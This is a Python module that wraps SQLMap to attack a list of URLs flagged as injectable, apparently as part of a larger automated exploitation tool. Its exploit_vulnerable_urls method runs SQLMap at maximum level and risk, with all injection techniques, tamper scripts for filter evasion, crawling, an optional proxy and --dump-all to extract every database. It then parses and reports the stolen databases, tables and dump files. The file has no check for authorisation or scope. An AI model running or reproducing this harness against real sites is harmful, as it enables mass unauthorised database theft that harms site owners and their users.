"""
SQLMap Integration Module
Automated SQLMap execution for vulnerable URLs
"""

import subprocess
import os
import json
import time
from typing import List, Dict, Optional
from pathlib import Path

class SQLMapIntegration:
    def __init__(self, sqlmap_path: Optional[str] = None, output_dir: str = "sqlmap_results"):
        self.sqlmap_path = sqlmap_path or self.find_sqlmap()
        self.output_dir = output_dir
        self.results = []
        
        # Create output directory
        os.makedirs(output_dir, exist_ok=True)
        
    def find_sqlmap(self) -> Optional[str]:
        """Find SQLMap installation"""
        # Common SQLMap locations
        possible_paths = [
            "/usr/share/sqlmap/sqlmap.py",  # Kali Linux default
            "/usr/bin/sqlmap",
            "sqlmap",
            os.path.expanduser("~/sqlmap/sqlmap.py"),
            os.path.expanduser("~/.local/share/sqlmap/sqlmap.py"),
        ]
        
        for path in possible_paths:
            if path == "sqlmap":
                # Check if sqlmap is in PATH
                try:
                    result = subprocess.run(
                        ["which", "sqlmap"],
                        capture_output=True,
                        text=True,
                        timeout=5
                    )
                    if result.returncode == 0:
                        return result.stdout.strip()
                except:
                    pass
            elif os.path.exists(path):
                return path
        
        return None
    
    def check_sqlmap_installed(self) -> bool:
        """Check if SQLMap is installed"""
        if not self.sqlmap_path:
            return False
        
        try:
            if self.sqlmap_path == "sqlmap" or os.path.basename(self.sqlmap_path) == "sqlmap":
                result = subprocess.run(
                    ["sqlmap", "--version"],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
            else:
                result = subprocess.run(
                    ["python3", self.sqlmap_path, "--version"],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
            
            return result.returncode == 0
        except Exception:
            return False
    
    def run_sqlmap(self, url: str, param: str, level: int = 3, risk: int = 2, 
                   batch: bool = True, threads: int = 10, 
                   proxy: Optional[str] = None) -> Dict:
        """Run SQLMap on a vulnerable URL"""
        if not self.check_sqlmap_installed():
            return {
                'url': url,
                'param': param,
                'success': False,
                'error': 'SQLMap not found. Install with: sudo apt install sqlmap'
            }
        
        # Create unique output file for this scan
        scan_id = f"{url.replace('://', '_').replace('/', '_').replace('?', '_').replace('&', '_')[:50]}_{param}"
        output_file = os.path.join(self.output_dir, f"{scan_id}.json")
        
        # Build SQLMap command
        cmd = []
        if self.sqlmap_path.endswith('.py'):
            cmd.extend(["python3", self.sqlmap_path])
        else:
            cmd.append(self.sqlmap_path)
        
        cmd.extend([
            "-u", url,
            "-p", param,
            "--level", str(level),
            "--risk", str(risk),
            "--batch",
            "--threads", str(threads),
            "--dump-all",  # Dump all databases
            "--output-dir", self.output_dir,
            "--forms",  # Test forms
            "--crawl", "2",  # Crawl depth
            "--tamper", "space2comment,charencode",  # Use tamper scripts
        ])
        
        # Add proxy if provided
        if proxy:
            cmd.extend(["--proxy", proxy])
        
        # Add additional aggressive options
        cmd.extend([
            "--technique", "BEUSTQ",  # All techniques
            "--timeout", "30",
            "--retries", "3",
            "--keep-alive",
            "--fresh-queries",
        ])
        
        try:
            print(f"[*] Running SQLMap on {url} (param: {param})...")
            print(f"[*] Command: {' '.join(cmd[:10])}...")
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=600,  # 10 minute timeout
            )
            
            # Check for success indicators
            success = False
            databases = []
            tables = []
            
            output = result.stdout + result.stderr
            
            # Parse SQLMap output
            if "is vulnerable" in output.lower() or "is injectable" in output.lower():
                success = True
            
            # Try to extract database names
            import re
            db_matches = re.findall(r'Database: (.+)', output)
            databases = list(set(db_matches))
            
            # Try to extract table names
            table_matches = re.findall(r'Table: (.+)', output)
            tables = list(set(table_matches))
            
            # Check for dumped data
            dumped_data = []
            dump_files = list(Path(self.output_dir).glob(f"{scan_id}*"))
            for dump_file in dump_files:
                if dump_file.is_file() and dump_file.suffix in ['.csv', '.txt', '.json']:
                    dumped_data.append(str(dump_file))
            
            return {
                'url': url,
                'param': param,
                'success': success,
                'databases': databases,
                'tables': tables,
                'dumped_files': dumped_data,
                'output': output[:1000],  # First 1000 chars
                'returncode': result.returncode
            }
            
        except subprocess.TimeoutExpired:
            return {
                'url': url,
                'param': param,
                'success': False,
                'error': 'SQLMap timeout (10 minutes)'
            }
        except Exception as e:
            return {
                'url': url,
                'param': param,
                'success': False,
                'error': str(e)
            }
    
    def exploit_vulnerable_urls(self, vulnerable_urls: List[Dict], 
                                use_proxy: bool = False, 
                                proxy: Optional[str] = None) -> List[Dict]:
        """Automatically exploit vulnerable URLs with SQLMap"""
        if not self.check_sqlmap_installed():
            print("[!] SQLMap not found. Skipping exploitation.")
            print("[*] Install SQLMap: sudo apt install sqlmap")
            return []
        
        results = []
        
        for vuln in vulnerable_urls:
            url = vuln.get('url')
            param = vuln.get('vulnerable_param')
            
            if not url or not param:
                continue
            
            # Run SQLMap with aggressive settings
            result = self.run_sqlmap(
                url=url,
                param=param,
                level=5,  # Maximum level
                risk=3,   # Maximum risk
                threads=10,
                proxy=proxy if use_proxy else None
            )
            
            results.append(result)
            
            if result.get('success'):
                print(f"[+] Successfully exploited: {url}")
                if result.get('databases'):
                    print(f"[+] Found databases: {', '.join(result['databases'])}")
                if result.get('tables'):
                    print(f"[+] Found tables: {', '.join(result['tables'][:5])}")
            else:
                print(f"[-] Failed to exploit: {url}")
            
            # Delay between scans
            time.sleep(5)
        
        return results
